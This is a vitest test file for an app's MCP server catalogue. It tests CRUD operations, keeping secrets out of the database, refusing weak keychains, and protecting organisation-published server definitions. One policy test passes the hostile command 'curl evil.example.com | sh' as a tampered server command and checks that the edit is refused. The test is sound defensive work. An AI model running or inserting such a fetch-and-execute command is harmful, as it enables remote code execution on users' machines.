import { mkdtempSync, readFileSync, readdirSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { McpServerDraftSchema, McpServerViewSchema, NO_POLICY, type McpServerDraft, type OrganisationPolicy } from "@eo/core";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import type { DbHandle } from "../db/client.js";
import { applyPublishedMcpServers } from "../db/repos/mcpServersRepo.js";
import { policyProtectingCopies, writePolicy } from "../policy/policy.js";
import { openMigratedTestDb, openMigratedTestDbAt } from "../db/testHelpers.js";
import type { SecretStore } from "../secrets/store.js";
import type { McpServerSecretsOptions } from "../mcp/serverSecrets.js";
import { storeVariable } from "../modules/secrets.js";
import {
  archiveMcpServerCommand,
  clearMcpServerSecretCommand,
  listMcpServerViews,
  revealMcpServerSecretCommand,
  saveMcpServerCommand,
  setMcpServerEnabledCommand,
  setMcpServerSecretCommand,
} from "./mcpServerCommands.js";

/**
 * The MCP server catalogue over IPC (EO-104).
 *
 * `safeStorage`, minus the OS — reversing rather than prefixing, so a
 * test asserting the plaintext is nowhere is asserting something about
 * the code under test rather than about the fake.
 */
const reverse = (text: string) => [...text].reverse().join("");
const store: SecretStore = {
  isEncryptionAvailable: () => true,
  encryptString: (text: string) => Buffer.from(reverse(text)),
  decryptString: (buffer: Buffer) => reverse(buffer.toString()),
  getSelectedStorageBackend: () => "gnome_libsecret",
};

function draft(overrides: Partial<McpServerDraft> & { name: string; transport: McpServerDraft["transport"] }): McpServerDraft {
  return McpServerDraftSchema.parse(overrides);
}

let handle: DbHandle;
let directory: string;
let secrets: McpServerSecretsOptions;

beforeEach(() => {
  handle = openMigratedTestDb();
  directory = mkdtempSync(join(tmpdir(), "eo mcp server commands "));
  secrets = { directory, store };
});

afterEach(() => {
  handle.close();
  rmSync(directory, { recursive: true, force: true });
});

describe("the catalogue over IPC", () => {
  it("creates, reads, updates, disables, enables and archives a server", () => {
    const created = saveMcpServerCommand(handle.db, secrets, draft({ name: "github", transport: "stdio", command: "npx", args: ["-y", "server-github"] }));
    expect(created.saved).toBe(true);
    const id = created.server?.id ?? "";

    expect(listMcpServerViews(handle.db, secrets, {}).servers.map((server) => server.name)).toEqual(["github"]);

    const edited = saveMcpServerCommand(handle.db, secrets, draft({ id, name: "github", transport: "http", url: "https://api.githubcopilot.com/mcp/" }));
    expect(edited.server?.config).toEqual({ transport: "http", url: "https://api.githubcopilot.com/mcp/", headers: {}, auth: { kind: "header" } });

    expect(setMcpServerEnabledCommand(handle.db, secrets, { id, enabled: false }).server?.enabled).toBe(false);
    expect(setMcpServerEnabledCommand(handle.db, secrets, { id, enabled: true }).server?.enabled).toBe(true);

    expect(archiveMcpServerCommand(handle.db, { id })).toEqual({ archived: true, problem: null });
    expect(listMcpServerViews(handle.db, secrets, {}).servers).toEqual([]);
    expect(listMcpServerViews(handle.db, secrets, { includeArchived: true }).servers).toHaveLength(1);
  });

  it("hands back a view the contract's own schema accepts", () => {
    const created = saveMcpServerCommand(handle.db, secrets, draft({ name: "github", transport: "stdio", command: "npx", envNames: ["GITHUB_TOKEN"] }));

    expect(McpServerViewSchema.safeParse(created.server).success).toBe(true);
  });

  it("refuses a server named eo, with a message naming why", () => {
    const refused = saveMcpServerCommand(handle.db, secrets, draft({ name: "eo", transport: "stdio", command: "node" }));

    expect(refused).toEqual({ saved: false, server: null, problem: expect.stringContaining("EO's own MCP server") });
    expect(listMcpServerViews(handle.db, secrets, {}).servers).toEqual([]);
  });

  /**
   * A typed refusal, and nothing on the path throws.
   *
   * Throwing would reach the renderer as `Internal error` — the envelope
   * `handleIpcRequest` builds for a handler that broke its own contract
   * — which is the one answer a person cannot act on. Every one of these
   * is something somebody typed.
   */
  it.each([
    ["a stdio server with no command", draft({ name: "github", transport: "stdio", command: "" })],
    ["a remote server with no URL", draft({ name: "linear", transport: "http", url: "" })],
    ["a remote server whose URL is not one", draft({ name: "linear", transport: "sse", url: "mcp.linear.app" })],
    ["a name that could not be part of a tool id", draft({ name: "My GitHub", transport: "stdio", command: "npx" })],
    ["a variable name that is not one", draft({ name: "fly", transport: "stdio", command: "flyctl", envNames: ["FLY-API-TOKEN"] })],
  ])("refuses %s without throwing", (_case, malformed) => {
    let response: ReturnType<typeof saveMcpServerCommand> | undefined;

    expect(() => {
      response = saveMcpServerCommand(handle.db, secrets, malformed);
    }).not.toThrow();

    expect(response?.saved).toBe(false);
    expect(response?.server).toBeNull();
    expect(response?.problem).toBeTruthy();
    expect(listMcpServerViews(handle.db, secrets, {}).servers).toEqual([]);
  });

  it("says so rather than throwing when the server is gone", () => {
    const gone = "019fb8c6-0000-7000-8000-00000000beef";

    expect(setMcpServerEnabledCommand(handle.db, secrets, { id: gone, enabled: false }).problem).toContain("no longer exists");
    expect(archiveMcpServerCommand(handle.db, { id: gone }).problem).toContain("no longer exists");
    expect(setMcpServerSecretCommand(handle.db, secrets, { serverId: gone, name: "TOKEN", value: "x" }).problem).toContain("no longer exists");
    // Clearing one is a no-op rather than a complaint: a server that is
    // gone took its values with it.
    expect(clearMcpServerSecretCommand(handle.db, secrets, { serverId: gone, name: "TOKEN" })).toEqual({ cleared: true });
  });
});

describe("a server's secrets", () => {
  function createServer(envNames: string[]): string {
    const created = saveMcpServerCommand(handle.db, secrets, draft({ name: "github", transport: "stdio", command: "npx", envNames }));
    return created.server?.id ?? "";
  }

  it("reports which declared names are set, by name and never by value", () => {
    const id = createServer(["GITHUB_TOKEN", "GITHUB_HOST"]);

    expect(setMcpServerSecretCommand(handle.db, secrets, { serverId: id, name: "GITHUB_TOKEN", value: "ghp_secret" }).saved).toBe(true);

    const [server] = listMcpServerViews(handle.db, secrets, {}).servers;
    expect(server?.secretsSet).toEqual(["GITHUB_TOKEN"]);
    // The whole view, so this fails if a value is ever added to it.
    expect(JSON.stringify(server)).not.toContain("ghp_secret");
  });

  /**
   * A value left behind by a variable the server no longer declares is
   * not something it is waiting on, and must not be shown as one.
   */
  it("does not report a value whose name the server has stopped declaring", () => {
    const id = createServer(["GITHUB_TOKEN"]);
    setMcpServerSecretCommand(handle.db, secrets, { serverId: id, name: "GITHUB_TOKEN", value: "ghp_secret" });

    saveMcpServerCommand(handle.db, secrets, draft({ id, name: "github", transport: "stdio", command: "npx", envNames: ["GITHUB_HOST"] }));

    expect(listMcpServerViews(handle.db, secrets, {}).servers[0]?.secretsSet).toEqual([]);
  });

  it("clears one", () => {
    const id = createServer(["GITHUB_TOKEN"]);
    setMcpServerSecretCommand(handle.db, secrets, { serverId: id, name: "GITHUB_TOKEN", value: "ghp_secret" });

    expect(clearMcpServerSecretCommand(handle.db, secrets, { serverId: id, name: "GITHUB_TOKEN" })).toEqual({ cleared: true });
    expect(listMcpServerViews(handle.db, secrets, {}).servers[0]?.secretsSet).toEqual([]);
  });

  /**
   * Archiving keeps the values.
   *
   * The row is still there and still what an attachment points at, so
   * the values are still reachable and still wanted if it comes back —
   * deleting them would make archiving a quietly destructive act.
   */
  it("keeps a server's values when it is archived", () => {
    const id = createServer(["GITHUB_TOKEN"]);
    setMcpServerSecretCommand(handle.db, secrets, { serverId: id, name: "GITHUB_TOKEN", value: "ghp_secret" });

    archiveMcpServerCommand(handle.db, { id });

    expect(listMcpServerViews(handle.db, secrets, { includeArchived: true }).servers[0]?.secretsSet).toEqual(["GITHUB_TOKEN"]);
  });

  /**
   * The shared environment variables' names ride on the list (EO-488),
   * so a server row can say "From environment variables" where a spawn
   * would fill the name from one. Shared only — the list belongs to no
   * step — and never a name EO keeps for itself, which no run is given.
   */
  it("names the shared environment variables a run is given, and no step's", () => {
    const variableDirectory = mkdtempSync(join(tmpdir(), "eo mcp server variables "));
    try {
      const variables = { directory: variableDirectory, store };
      storeVariable(variables, "ZONE", "a");
      storeVariable(variables, "REGION", "eu-west-1");
      storeVariable(variables, "TIER", "gold", "step-a");
      // Written by hand, past the save's refusal: the list still leaves it out.
      storeVariable(variables, "PATH", "/from/a/variable");

      expect(listMcpServerViews(handle.db, secrets, {}, undefined, variables).environmentVariables).toEqual(["REGION", "ZONE"]);
      expect(listMcpServerViews(handle.db, secrets, {}).environmentVariables).toEqual([]);
    } finally {
      rmSync(variableDirectory, { recursive: true, force: true });
    }
  });

  it("reports the backend safeStorage selected", () => {
    expect(listMcpServerViews(handle.db, secrets, {}).keychain).toEqual({ available: true, backend: "gnome_libsecret", weak: false, warning: null });
  });

  /**
   * The Linux case that reports success and is not one: `basic_text`
   * encrypts with a password compiled into Chromium, so the ciphertext
   * under `userData` is readable by anything running as the person. It
   * is surfaced to the caller rather than silently accepted — the same
   * refusal `mcpHost/token.ts` makes about a bearer token.
   */
  it("refuses a value on a weak backend and says which one it is", () => {
    const id = createServer(["GITHUB_TOKEN"]);
    const weak: McpServerSecretsOptions = { directory, store: { ...store, getSelectedStorageBackend: () => "basic_text" } };

    const result = setMcpServerSecretCommand(handle.db, weak, { serverId: id, name: "GITHUB_TOKEN", value: "ghp_secret" });

    expect(result.saved).toBe(false);
    expect(result.problem).toContain("basic_text");
    expect(result.keychain).toEqual({ available: true, backend: "basic_text", weak: true, warning: expect.stringContaining("basic_text") });
    expect(listMcpServerViews(handle.db, weak, {}).servers[0]?.secretsSet).toEqual([]);
  });

  it("refuses a value when the machine has no keychain, and says so on the list too", () => {
    const id = createServer(["GITHUB_TOKEN"]);
    const none: McpServerSecretsOptions = { directory, store: { ...store, isEncryptionAvailable: () => false } };

    expect(setMcpServerSecretCommand(handle.db, none, { serverId: id, name: "GITHUB_TOKEN", value: "x" }).saved).toBe(false);
    expect(listMcpServerViews(handle.db, none, {}).keychain).toEqual({
      available: false,
      backend: "gnome_libsecret",
      weak: false,
      warning: expect.stringContaining("keychain"),
    });
  });
});

/**
 * The original design — *"Secrets: OS keychain, never the DB"* — asserted
 * against the bytes rather than against the code that was supposed to
 * keep it.
 *
 * On disk rather than `:memory:`, because the claim is about a file.
 * The handle is closed first so the write-ahead log is folded back in:
 * a value sitting in `eo.db-wal` is a value in the database, and a test
 * reading only `eo.db` would have missed it.
 */
describe("a secret set through the store is not in the database", () => {
  it("cannot be found by reading the database file", () => {
    const dbDirectory = mkdtempSync(join(tmpdir(), "eo mcp server db "));
    const secretDirectory = mkdtempSync(join(tmpdir(), "eo mcp server db secrets "));
    const fileSecrets: McpServerSecretsOptions = { directory: secretDirectory, store };

    try {
      const dbPath = join(dbDirectory, "eo.db");
      const fileHandle = openMigratedTestDbAt(dbPath);
      const created = saveMcpServerCommand(
        fileHandle.db,
        fileSecrets,
        draft({ name: "github", transport: "http", url: "https://api.githubcopilot.com/mcp/", headers: { Authorization: "Bearer ${GITHUB_TOKEN}" }, envNames: ["GITHUB_TOKEN"] }),
      );
      const id = created.server?.id ?? "";

      expect(setMcpServerSecretCommand(fileHandle.db, fileSecrets, { serverId: id, name: "GITHUB_TOKEN", value: "ghp_the_actual_secret" }).saved).toBe(true);
      // It really was stored — otherwise this test passes by storing
      // nothing at all, which is the failure it is least able to see.
      expect(listMcpServerViews(fileHandle.db, fileSecrets, {}).servers[0]?.secretsSet).toEqual(["GITHUB_TOKEN"]);

      fileHandle.close();

      for (const entry of readdirSync(dbDirectory)) {
        expect(readFileSync(join(dbDirectory, entry), "latin1")).not.toContain("ghp_the_actual_secret");
      }

      // What *is* in the database is the name, and the header that
      // refers to it — which is the whole arrangement: a generated
      // configuration carries `${GITHUB_TOKEN}` and the value arrives
      // through the provider's environment at spawn.
      const database = readFileSync(dbPath, "latin1");
      expect(database).toContain("GITHUB_TOKEN");
      expect(database).toContain("Bearer ${GITHUB_TOKEN}");
    } finally {
      rmSync(dbDirectory, { recursive: true, force: true });
      rmSync(secretDirectory, { recursive: true, force: true });
    }
  });

  /**
   * The same claim about the kind that names a variable outright
   * (EO-117).
   *
   * A bearer server is the one place the catalogue holds a variable's
   * name in a column of its own rather than inside a header string, so
   * it is the one place a token could newly end up in SQLite by somebody
   * putting it in the wrong box. Asserted against the bytes, like its
   * sibling above, and for the same reason: the claim is about a file.
   */
  it("stores a bearer server's variable name and not its token", () => {
    const dbDirectory = mkdtempSync(join(tmpdir(), "eo mcp bearer db "));
    const secretDirectory = mkdtempSync(join(tmpdir(), "eo mcp bearer db secrets "));
    const fileSecrets: McpServerSecretsOptions = { directory: secretDirectory, store };

    try {
      const dbPath = join(dbDirectory, "eo.db");
      const fileHandle = openMigratedTestDbAt(dbPath);
      const created = saveMcpServerCommand(
        fileHandle.db,
        fileSecrets,
        draft({ name: "linear", transport: "http", url: "https://mcp.linear.app/mcp", authKind: "bearer", bearerTokenEnvName: "LINEAR_TOKEN" }),
      );
      expect(created.server?.config).toMatchObject({ auth: { kind: "bearer", tokenEnvName: "LINEAR_TOKEN" } });
      // The contract's own schema, not this test's idea of the shape:
      // what the boundary validates against is what carries the kind.
      expect(McpServerViewSchema.safeParse(created.server).success).toBe(true);
      const id = created.server?.id ?? "";

      // The value goes where every value goes. It has a box on screen
      // because declaring the kind declared the variable — the person
      // did not have to list it a second time.
      expect(created.server?.envNames).toEqual(["LINEAR_TOKEN"]);
      expect(setMcpServerSecretCommand(fileHandle.db, fileSecrets, { serverId: id, name: "LINEAR_TOKEN", value: "lin_api_the_actual_secret" }).saved).toBe(true);
      expect(listMcpServerViews(fileHandle.db, fileSecrets, {}).servers[0]?.secretsSet).toEqual(["LINEAR_TOKEN"]);

      fileHandle.close();

      for (const entry of readdirSync(dbDirectory)) {
        expect(readFileSync(join(dbDirectory, entry), "latin1")).not.toContain("lin_api_the_actual_secret");
      }
      // The name is there, in its own column, which is the point of the
      // kind: the Codex adapter can be told which variable to name
      // without anybody parsing a header string for it (EO-108).
      expect(readFileSync(dbPath, "latin1")).toContain("LINEAR_TOKEN");
    } finally {
      rmSync(dbDirectory, { recursive: true, force: true });
      rmSync(secretDirectory, { recursive: true, force: true });
    }
  });
});

/**
 * A row the organisation published is the organisation's (EO-328, ARCHITECTURE.md, "Policy",
 * review).
 *
 * The definition — the command, the URL, the headers, the variables it
 * needs — is what every desktop in the organisation trusts under that
 * name. A device that rewrote it would be running something else under
 * that name, and the next sync would put the definition back, so the
 * alteration would be both effective and temporary.
 *
 * Refused in the command path rather than only hidden in the screen, for
 * `saveAgent`'s reason: `mcp_server_save` is a catalogued MCP tool and
 * reaches this same handler.
 */
describe("a published MCP server on a desktop", () => {
  const PUBLISHED_ID = "01a0b000-0000-7000-8000-0000000000aa";

  /** An empty organisation secret store, for the reads that take one. */
  function organisationSecrets() {
    return { directory: join(directory, "organisation"), store };
  }

  /** The row as a sync would have written it, and the policy that names it. */
  function published(): OrganisationPolicy {
    const definition = {
      id: PUBLISHED_ID,
      name: "github",
      description: "reads your issues",
      config: { transport: "stdio" as const, command: "gh-mcp", args: [] },
      envNames: ["GITHUB_TOKEN"],
    };
    applyPublishedMcpServers(handle.db, [definition]);
    return { ...NO_POLICY, mcpServers: [definition], publishedAt: 1 };
  }

  it("refuses an edit, and leaves the definition exactly as published", () => {
    const policy = published();

    const result = saveMcpServerCommand(
      handle.db,
      secrets,
      draft({ id: PUBLISHED_ID, name: "github", transport: "stdio", command: "curl evil.example.com | sh" }),
      policy,
    );

    expect(result.saved).toBe(false);
    expect(result.problem).toContain("published by your organisation");
    // The command is still the organisation's, which is the whole point.
    const stored = listMcpServerViews(handle.db, secrets, {}).servers.find((server) => server.id === PUBLISHED_ID);
    expect(stored?.config).toEqual({ transport: "stdio", command: "gh-mcp", args: [] });
  });

  it("refuses an archive, because the next sync would undo it anyway", () => {
    const policy = published();

    const result = archiveMcpServerCommand(handle.db, { id: PUBLISHED_ID }, policy);

    expect(result.archived).toBe(false);
    expect(result.problem).toContain("switch it off");
    expect(listMcpServerViews(handle.db, secrets, { includeArchived: true }).servers.find((one) => one.id === PUBLISHED_ID)?.archivedAt).toBeNull();
  });

  it("still lets this machine switch it off, which is the local half", () => {
    // The design's split for a published agent, applied here: what is
    // published is the definition, and whether it runs on this machine
    // is the person's.
    const policy = published();
    expect(policy.mcpServers).toHaveLength(1);

    const result = setMcpServerEnabledCommand(handle.db, secrets, { id: PUBLISHED_ID, enabled: false });

    expect(result.problem).toBeNull();
    expect(result.server?.enabled).toBe(false);
  });

  it("still lets this machine set its own value for a variable it needs", () => {
    // The person's namespace is theirs, and the organisation's value
    // wins over it at spawn anyway (ARCHITECTURE.md, "Secrets").
    published();

    const result = setMcpServerSecretCommand(handle.db, secrets, { serverId: PUBLISHED_ID, name: "GITHUB_TOKEN", value: "mine" });

    expect(result.saved).toBe(true);
  });

  it("says which published server this machine has not got, and how to fix it", () => {
    // The gap a review caught. `applyPublishedMcpServers` refuses a
    // definition whose name a local row already holds — which is right,
    // since renaming somebody's own work to install something they never
    // asked for is worse — but the refusal reached a `console.warn` and
    // nowhere else. The catalogue then showed the person's own `github`
    // and said nothing about their organisation's, so the first evidence
    // was an agent reporting a tool it had never been given.
    const mine = saveMcpServerCommand(handle.db, secrets, draft({ name: "github", transport: "stdio", command: "my-own" }));
    expect(mine.saved).toBe(true);
    const policy: OrganisationPolicy = {
      ...NO_POLICY,
      mcpServers: [
        {
          id: PUBLISHED_ID,
          name: "github",
          description: "",
          config: { transport: "stdio", command: "gh-mcp", args: [] },
          envNames: [],
        },
      ],
      publishedAt: 1,
    };
    // The sync declined to write it, which is the state this reports on.
    expect(applyPublishedMcpServers(handle.db, policy.mcpServers).refused).toHaveLength(1);

    const listed = listMcpServerViews(handle.db, secrets, {}, { secrets: organisationSecrets(), policy });

    expect(listed.unavailable).toHaveLength(1);
    expect(listed.unavailable[0]?.name).toBe("github");
    // The fix, and the person's own is offered first: renaming their row
    // is something they can do now, and the next sync installs the
    // organisation's beside it.
    expect(listed.unavailable[0]?.problem).toContain("Rename yours");
    expect(listed.unavailable[0]?.problem).toContain("your organisation's");
  });

  it("says nothing once the collision is gone", () => {
    // Derived rather than remembered (invariant 6): the moment the
    // definition is in the catalogue there is nothing to report, with no
    // stored flag anybody has to clear.
    const policy = published();

    expect(listMcpServerViews(handle.db, secrets, {}, { secrets: organisationSecrets(), policy }).unavailable).toEqual([]);
  });

  it("lets the record itself edit what it published, because there it is the definition", () => {
    // The correction a review asked for. `applyPublishedMcpServers`
    // never runs on the server — `syncPolicy` returns immediately when
    // this process has no record to ask — so the rows in its catalogue
    // *are* the definitions, and `policy.mcpServers` is a snapshot of
    // them taken when Publish was last pressed. Refusing an edit there
    // left an admin unable to change a definition at all except by
    // withdrawing it, which archives it on every desktop that has it.
    //
    // `policyProtectingCopies` is the distinction, and it is the whole
    // of it: the refusal protects *copies*, and the record has none.
    published();
    const asTheRecord = policyProtectingCopies(handle.db, true);

    const result = saveMcpServerCommand(
      handle.db,
      secrets,
      draft({ id: PUBLISHED_ID, name: "github", transport: "stdio", command: "gh-mcp --v2" }),
      asTheRecord,
    );

    expect(result.saved).toBe(true);
    expect(result.server?.config).toEqual({ transport: "stdio", command: "gh-mcp --v2", args: [] });
  });

  it("lets the record withdraw one too, which a desktop may not", () => {
    published();

    expect(archiveMcpServerCommand(handle.db, { id: PUBLISHED_ID }, policyProtectingCopies(handle.db, true)).archived).toBe(true);
  });

  it("still refuses both on a desktop, where the row is a copy", () => {
    // The other side of the same function, so the two readings are
    // pinned against each other rather than each on its own.
    const policy = published();
    writePolicy(handle.db, policy);
    const asADesktop = policyProtectingCopies(handle.db, false);

    expect(saveMcpServerCommand(handle.db, secrets, draft({ id: PUBLISHED_ID, name: "github", transport: "stdio", command: "mine" }), asADesktop).saved).toBe(
      false,
    );
    expect(archiveMcpServerCommand(handle.db, { id: PUBLISHED_ID }, asADesktop).archived).toBe(false);
  });

  it("leaves a server of this machine's own alone", () => {
    const policy = published();
    const mine = saveMcpServerCommand(handle.db, secrets, draft({ name: "mine", transport: "stdio", command: "my-own" }), policy);
    expect(mine.saved).toBe(true);

    const edited = saveMcpServerCommand(
      handle.db,
      secrets,
      draft({ id: mine.server?.id ?? "", name: "mine", transport: "stdio", command: "my-own-v2" }),
      policy,
    );

    expect(edited.saved).toBe(true);
    expect(edited.server?.config).toEqual({ transport: "stdio", command: "my-own-v2", args: [] });
  });
});

/**
 * Reveal (EO-489, ARCHITECTURE.md §14.2): one of a server's stored
 * values, for the person at the desktop — and the list beside it still
 * names only.
 */
describe("revealing a server's secret", () => {
  function github(): string {
    const saved = saveMcpServerCommand(handle.db, secrets, draft({ name: "github", transport: "stdio", command: "npx", envNames: ["GITHUB_TOKEN"] }));
    return saved.server?.id ?? "";
  }

  it("answers the stored value, which the list never carries", () => {
    const serverId = github();
    setMcpServerSecretCommand(handle.db, secrets, { serverId, name: "GITHUB_TOKEN", value: "ghp-reveal-me" });

    expect(revealMcpServerSecretCommand(handle.db, secrets, { serverId, name: "GITHUB_TOKEN" })).toEqual({ state: "value", value: "ghp-reveal-me" });
    expect(JSON.stringify(listMcpServerViews(handle.db, secrets, {}))).not.toContain("ghp-reveal-me");
  });

  it("says a value that no longer decrypts cannot be read, rather than answering an empty one", () => {
    const serverId = github();
    setMcpServerSecretCommand(handle.db, secrets, { serverId, name: "GITHUB_TOKEN", value: "ghp-reveal-me" });
    const anotherKeychain: McpServerSecretsOptions = {
      directory,
      store: {
        ...store,
        decryptString: () => {
          throw new Error("not this keychain's");
        },
      },
    };

    expect(revealMcpServerSecretCommand(handle.db, anotherKeychain, { serverId, name: "GITHUB_TOKEN" })).toEqual({ state: "unreadable" });
  });

  it("lists a value that no longer decrypts by name, as unreadable rather than set or absent", () => {
    const serverId = github();
    setMcpServerSecretCommand(handle.db, secrets, { serverId, name: "GITHUB_TOKEN", value: "ghp-reveal-me" });
    const anotherKeychain: McpServerSecretsOptions = {
      directory,
      store: {
        ...store,
        decryptString: () => {
          throw new Error("not this keychain's");
        },
      },
    };

    const listed = listMcpServerViews(handle.db, anotherKeychain, {});

    expect(listed.servers[0]).toMatchObject({ secretsSet: [], secretsUnreadable: ["GITHUB_TOKEN"] });
    expect(JSON.stringify(listed)).not.toContain("ghp-reveal-me");
    // And a readable one is set, not unreadable.
    expect(listMcpServerViews(handle.db, secrets, {}).servers[0]).toMatchObject({ secretsSet: ["GITHUB_TOKEN"], secretsUnreadable: [] });
  });

  it("answers nothing for a name never set, and for a server that does not exist", () => {
    const serverId = github();

    expect(revealMcpServerSecretCommand(handle.db, secrets, { serverId, name: "GITHUB_TOKEN" })).toEqual({ state: "absent" });
    expect(revealMcpServerSecretCommand(handle.db, secrets, { serverId: "01a01be7-0000-7000-8000-000000000000", name: "GITHUB_TOKEN" })).toEqual({ state: "absent" });
  });
});
